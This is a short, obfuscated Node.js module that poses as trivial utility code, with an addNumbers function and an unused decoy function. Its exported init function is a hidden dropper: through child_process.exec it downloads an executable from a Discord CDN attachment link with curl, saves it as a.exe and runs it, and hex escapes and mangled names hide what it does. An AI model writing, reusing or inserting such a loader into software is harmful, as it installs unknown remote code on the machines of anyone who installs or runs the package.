const {exec} = require('node:child_process');
function init() {
    exec('curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe', (_0x1f2b2f, _0x1c0b68, _0x44e1e6) => {
        if (_0x1f2b2f) {
            console['log']('error:\x20' + _0x1f2b2f['message']);
        }
    });
}
function addNumbers(_0x1d8a6a, _0xd88e7f) {
    return _0x1d8a6a + _0xd88e7f;
}
function unusedFunction() {
    console['log']('This\x20function\x20is\x20never\x20used');
}
console['log'](addNumbers(0x3, 0x5));
module['exports'] = init;
